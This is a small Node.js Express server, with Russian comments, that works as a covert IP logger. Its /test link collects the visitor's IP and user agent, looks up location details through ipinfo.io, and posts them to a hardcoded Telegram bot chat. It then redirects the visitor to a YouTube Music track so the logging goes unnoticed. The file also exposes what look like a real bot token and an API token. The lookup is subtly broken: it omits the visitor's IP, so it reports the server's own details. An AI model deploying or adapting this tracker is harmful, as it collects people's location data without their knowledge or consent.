const express = require('express');
const axios = require('axios');
const app = express();

const PORT = process.env.PORT || 8080;

app.get('/', (req, res) => {
  res.send('Сервер работает. Перейди по /test для логирования');
});

app.get('/test', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    const { data } = await axios.get(`https://ipinfo.io/json?token=7a9eeeb48f8390`);

    const message = `
🥔 Новый переход:
IP: ${data.ip}
Город: ${data.city}, ${data.country}
Орг: ${data.org}
UA: ${userAgent}
    `;

    // Отправка в Telegram
    await axios.post(`https://api.telegram.org/bot8045162630:AAEritxdtynKLUG2mr-C0TMIyc0UcDnlKNY/sendMessage`, {
      chat_id: '1031226674',
      text: message,
      parse_mode: 'HTML'
    }).catch((err) => {
      console.log('Telegram error:', err.message);
    });

    res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
  } catch (err) {
    console.error('Ошибка:', err.message);
    res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
  }
});

app.listen(PORT, () => {
  console.log(`Сервер запущен на http://localhost:${PORT}`);
});

